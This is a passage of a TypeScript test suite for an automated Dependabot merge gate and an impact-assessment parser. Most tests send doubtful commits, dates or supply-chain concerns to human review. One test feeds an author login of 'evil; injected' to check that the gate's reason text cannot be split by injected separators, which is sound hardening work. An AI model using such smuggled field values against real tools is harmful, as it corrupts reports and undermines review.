  test("accepts a merge commit made by someone through web-flow", () => {
    expect(verdictOf({ commits: [DEPENDABOT_COMMIT, MERGE_COMMIT] })).toBe(
      "ok",
    );
  });

  test("needs a human when a merge commit is not committed by web-flow", () => {
    expect(
      verdictOf({
        commits: [
          DEPENDABOT_COMMIT,
          { ...MERGE_COMMIT, committerLogin: "dependabot[bot]" },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a merge commit is not verified", () => {
    expect(
      verdictOf({
        commits: [DEPENDABOT_COMMIT, { ...MERGE_COMMIT, verified: false }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the commits are only merge commits", () => {
    expect(verdictOf({ commits: [MERGE_COMMIT] })).toBe("needs_human");
  });

  test("accepts a merge commit with more than two parents", () => {
    expect(
      verdictOf({
        commits: [DEPENDABOT_COMMIT, { ...MERGE_COMMIT, parentCount: 3 }],
      }),
    ).toBe("ok");
  });

  test("needs a human when a commit has no parent", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, parentCount: 0 }] }),
    ).toBe("needs_human");
  });

  test("needs a human when the parent count is negative", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, parentCount: -1 }] }),
    ).toBe("needs_human");
  });

  test("needs a human when the parent count is not an integer", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, parentCount: 1.5 }] }),
    ).toBe("needs_human");
  });

  test("needs a human when the parent count is NaN", () => {
    expect(
      verdictOf({
        commits: [{ ...DEPENDABOT_COMMIT, parentCount: Number.NaN }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the parent count is infinite", () => {
    expect(
      verdictOf({
        commits: [
          DEPENDABOT_COMMIT,
          { ...DEPENDABOT_COMMIT, parentCount: Number.POSITIVE_INFINITY },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a merge commit is committed by github-actions", () => {
    expect(
      verdictOf({
        commits: [
          DEPENDABOT_COMMIT,
          { ...MERGE_COMMIT, committerLogin: "github-actions[bot]" },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the committer of a merge commit is unknown", () => {
    expect(
      verdictOf({
        commits: [DEPENDABOT_COMMIT, { ...MERGE_COMMIT, committerLogin: null }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a committer is not dependabot", () => {
    expect(
      verdictOf({
        commits: [{ ...DEPENDABOT_COMMIT, committerLogin: "someone" }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a committer is unknown", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, committerLogin: null }] }),
    ).toBe("needs_human");
  });

  test("needs a human when a commit is not verified", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, verified: false }] }),
    ).toBe("needs_human");
  });

  test("needs a human when only one of two commits is by someone else", () => {
    expect(
      verdictOf({
        commits: [
          DEPENDABOT_COMMIT,
          { ...DEPENDABOT_COMMIT, authorLogin: "someone" },
        ],
      }),
    ).toBe("needs_human");
  });

  test("accepts several commits by dependabot", () => {
    expect(verdictOf({ commits: [DEPENDABOT_COMMIT, DEPENDABOT_COMMIT] })).toBe(
      "ok",
    );
  });

  test("keeps an author login from breaking the reason into items", () => {
    const result = evaluateGate(validInput({ authorLogin: "evil; injected" }));

    expect(result.ok ? "" : result.reason).not.toContain("; injected");
  });

  test("shortens an author login in the reason", () => {
    const result = evaluateGate(validInput({ authorLogin: "x".repeat(500) }));

    expect(result.ok ? "" : result.reason.length).toBeLessThan(200);
  });

  test("needs a human when no check is required", () => {
    expect(verdictOf({ requiredChecks: [], checks: [] })).toBe("needs_human");
  });

  test("needs a human when the minimum days is not finite", () => {
    expect(verdictOf({ minPublishedDays: Number.NaN })).toBe("needs_human");
  });

  test("needs a human when the publish date has no time zone", () => {
    expect(verdictOf({ publishedAtIso: "2026-10-01T00:00:00" })).toBe(
      "needs_human",
    );
  });

  test("needs a human when the publish date is invalid", () => {
    expect(verdictOf({ publishedAtIso: "unknown" })).toBe("needs_human");
  });

  test("waits when the version was published too recently", () => {
    expect(verdictOf({ publishedAtIso: "2026-10-18T00:00:00.000Z" })).toBe(
      "wait",
    );
  });

  test("prefers needs_human over wait", () => {
    expect(
      verdictOf({
        publishedAtIso: "2026-10-18T00:00:00.000Z",
        update: "major",
      }),
    ).toBe("needs_human");
  });

  test("explains why the gate stopped", () => {
    const result = evaluateGate(validInput({ update: "major" }));

    expect(result.ok ? "" : result.reason).toContain("major");
  });
});

describe("parseImpactAssessment", () => {
  const valid: ImpactAssessment = {
    impact: "none",
    evidence: "The package is a dev dependency used only in tests.",
    supplyChainConcerns: [],
    unverified: ["runtime behavior of the new version"],
  };

  test("accepts a well-formed assessment", () => {
    expect(parseImpactAssessment(valid)).toEqual(valid);
  });

  test("drops unknown keys", () => {
    expect(parseImpactAssessment({ ...valid, extra: 1 })).toEqual(valid);
  });

  test("throws when impact is out of range", () => {
    expect(() => parseImpactAssessment({ ...valid, impact: "high" })).toThrow();
  });

  test("throws when supplyChainConcerns is not an array", () => {
    expect(() =>
      parseImpactAssessment({ ...valid, supplyChainConcerns: "none" }),
    ).toThrow();
  });

  test("throws when supplyChainConcerns has a non-string item", () => {
    expect(() =>
      parseImpactAssessment({ ...valid, supplyChainConcerns: [1] }),
    ).toThrow();
  });

  test("throws when unverified is missing", () => {
    expect(() =>
      parseImpactAssessment({
        impact: valid.impact,
        evidence: valid.evidence,
        supplyChainConcerns: valid.supplyChainConcerns,
      }),
    ).toThrow();
  });

  test("throws when evidence is not a string", () => {
    expect(() => parseImpactAssessment({ ...valid, evidence: 3 })).toThrow();
  });

  test("throws when the input is not an object", () => {
    expect(() => parseImpactAssessment("none")).toThrow();
  });
});

describe("parseImpactAssessment limits", () => {
  const base: ImpactAssessment = {
    impact: "none",
    evidence: "used only in tests",
    supplyChainConcerns: [],
    unverified: [],
  };

  test("throws when evidence is empty", () => {
    expect(() => parseImpactAssessment({ ...base, evidence: "" })).toThrow();
  });

  test("throws when evidence is only whitespace", () => {
    expect(() =>
      parseImpactAssessment({ ...base, evidence: " \n\t " }),
    ).toThrow();
  });

  test("accepts evidence of exactly 4000 characters", () => {
    expect(
      parseImpactAssessment({ ...base, evidence: "e".repeat(4000) }).evidence,
    ).toHaveLength(4000);
  });

  test("throws when evidence is longer than 4000 characters", () => {
    expect(() =>
      parseImpactAssessment({ ...base, evidence: "e".repeat(4001) }),
    ).toThrow();
  });

  test("accepts 20 supplyChainConcerns", () => {
    expect(
      parseImpactAssessment({
        ...base,
        supplyChainConcerns: Array.from({ length: 20 }, () => "c"),
      }).supplyChainConcerns,
    ).toHaveLength(20);
  });

  test("throws when there are more than 20 supplyChainConcerns", () => {
    expect(() =>
      parseImpactAssessment({
        ...base,
        supplyChainConcerns: Array.from({ length: 21 }, () => "c"),
      }),
    ).toThrow();
  });

  test("throws when there are more than 20 unverified items", () => {
    expect(() =>
      parseImpactAssessment({
        ...base,
        unverified: Array.from({ length: 21 }, () => "u"),
      }),
    ).toThrow();
  });

  test("accepts an item of exactly 500 characters", () => {
    expect(
      parseImpactAssessment({ ...base, unverified: ["u".repeat(500)] })
        .unverified,
    ).toHaveLength(1);
  });

  test("throws when a supplyChainConcerns item is longer than 500 characters", () => {
    expect(() =>
      parseImpactAssessment({
        ...base,
        supplyChainConcerns: ["c".repeat(501)],
      }),
    ).toThrow();
  });

  test("throws when an unverified item is longer than 500 characters", () => {
    expect(() =>
      parseImpactAssessment({ ...base, unverified: ["u".repeat(501)] }),
    ).toThrow();
  });
});

describe("decideImpactOutcome", () => {
  const clean: ImpactAssessment = {
    impact: "none",
    evidence: "used only in tests",
    supplyChainConcerns: [],
    unverified: [],
  };

  test("merges when there is no impact and nothing is left open", () => {
    expect(decideImpactOutcome(clean).outcome).toBe("merge");
  });

  test("asks for a fix when there is an impact and nothing is left open", () => {
    expect(decideImpactOutcome({ ...clean, impact: "impact" }).outcome).toBe(
      "fix",
    );
  });

  test("needs a human when a supply chain concern is reported", () => {
    expect(
      decideImpactOutcome({ ...clean, supplyChainConcerns: ["new maintainer"] })
        .outcome,
    ).toBe("needs_human");
  });

  test("needs a human when something is unverified", () => {
    expect(
      decideImpactOutcome({ ...clean, unverified: ["runtime behavior"] })
        .outcome,
    ).toBe("needs_human");
  });

  test("needs a human for an impact with a supply chain concern", () => {
    expect(
      decideImpactOutcome({
        ...clean,
        impact: "impact",
        supplyChainConcerns: ["new maintainer"],
      }).outcome,
    ).toBe("needs_human");
  });

  test("explains the outcome", () => {
    expect(
      decideImpactOutcome({ ...clean, unverified: ["runtime behavior"] })
        .reason,
    ).toContain("unverified");
  });
});
